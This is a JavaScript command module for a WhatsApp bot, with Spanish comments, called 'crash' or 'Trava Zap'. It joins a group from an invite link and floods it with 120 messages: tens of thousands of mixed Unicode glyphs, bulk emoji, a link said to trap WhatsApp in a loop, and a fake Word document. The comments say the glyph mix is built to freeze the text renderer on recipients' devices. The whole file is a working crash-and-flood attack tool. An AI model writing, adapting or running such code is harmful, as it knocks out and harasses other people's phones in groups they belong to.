export default {
  name: ["crash"],
  description: "Trava Zap: ráfaga con mezcla caótica de miles de símbolos",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });
    const code = match[1];

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: '⚠️ No pude leer el grupo. Enlace inválido o expirado.' });
    }
    try { await sock.groupAcceptInvite(code); } catch {}

    // === TRAVA ZAP ===
    // Mezcla caótica de +1.400 glifos DISTINTOS (no repetir uno solo).
    // El motor de texto tiene que medir/dibujar cada forma diferente -> traba.
    const RANGES = [
      [0x00A1, 0x00FF], // ¡¢£¤... acentos
      [0x0391, 0x03C9], // griego
      [0x0410, 0x044F], // cirílico
      [0x05D0, 0x05EA], // hebreo
      [0x0621, 0x064A], // árabe
      [0x0905, 0x0939], // devanagari
      [0x0E01, 0x0E2E], // tailandés
      [0x2200, 0x22FF], // símbolos matemáticos
      [0x2190, 0x21FF], // flechas
      [0x2500, 0x257F], // dibujo de cajas
      [0x25A0, 0x25FF], // formas geométricas
      [0x2600, 0x26FF], // símbolos varios
      [0x2700, 0x27BF], // dingbats
    ];

    const POOL = RANGES
      .map(([a, b]) => {
        let s = '';
        for (let c = a; c <= b; c++) s += String.fromCodePoint(c);
        return s;
      })
      .join('');

    const TRAVA = POOL.repeat(Math.ceil(60000 / POOL.length)); // ~60.000 símbolos

    const EMOJI = '😭🔥💀👻🤖💥🌟🍕🚀🎉😂😍😱🥶🤯👽🎃🧠🍀⚡🌈🐉🦖🌋🎯🥵😵‍💫🫠👾🤡🦄🍩☠️🎸🏆💎🧨🔮🪐🌙⭐🎈🥳🤩😎'.repeat(600);

    const builds = [
      () => sock.sendMessage(groupId, { text: TRAVA }),
      () => sock.sendMessage(groupId, { text: EMOJI }),
      () => sock.sendMessage(groupId, { text: 'wa.me/channel' }), // link que mete a WhatsApp en bucle
      () => sock.sendMessage(groupId, {
        document: Buffer.from(TRAVA),
        fileName: 'trava.doc',
        mimetype: 'application/msword',
        caption: TRAVA,
      }),
    ];

    const total = 120;
    const delayMs = 800;

    await reply({ text: `💥 Trava Zap → ${groupId}\n> ${total} mensajes · ~${Math.round((total * delayMs) / 1000)}s` });

    for (let i = 0; i < total; i++) {
      try {
        await builds[i % builds.length]();
      } catch {
        // sigue con el resto
      }
      await new Promise((r) => setTimeout(r, delayMs));
    }

    await reply({ text: `✅ Listo: ${total} mensajes a ${groupId}.` });
  },
};